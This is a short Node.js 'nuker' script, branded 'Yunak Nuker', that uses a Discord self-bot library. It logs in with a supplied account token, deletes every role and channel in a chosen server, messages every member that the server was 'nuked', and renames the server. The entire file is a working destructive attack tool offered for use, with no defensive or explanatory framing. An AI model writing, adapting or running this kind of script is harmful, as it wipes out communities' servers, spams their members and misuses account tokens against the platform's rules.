const readline = require('readline').createInterface({ input: process.stdin, output: process.stdout });
const fs = require('fs');
const { Client } = require('discord.js-selfbot-v13');

readline.question("> Token: ",  async (reply) => {

    const client = new Client({checkUpdate: false});
    client.login(reply).then(async() => {
        readline.question("> Guild ID: ",  async (reply) => {
         let guild = await client.guilds.cache.get(reply);
         if(!guild) {
                console.log("[!] Invalid guild ID");
                process.exit();
         }
          await guild.roles.cache.forEach((role) => role.delete().catch(() => {}))
          await guild.channels.cache.forEach((channel) => channel.delete().catch(() => {}))
          await guild.members.cache.forEach((member) => member.send({content : "nuked by (Yunak Nuker | .gg/script)"}).catch(() => {}))
          await guild.setName("Yunak Nuker | .gg/script").catch(() => {})
          await console.log(`[+] ${guild.name} nuked`);
        })
    })
    .catch(async err => { 
        await console.log(`[-] invalid token`) 
        process.exit();
    });


})
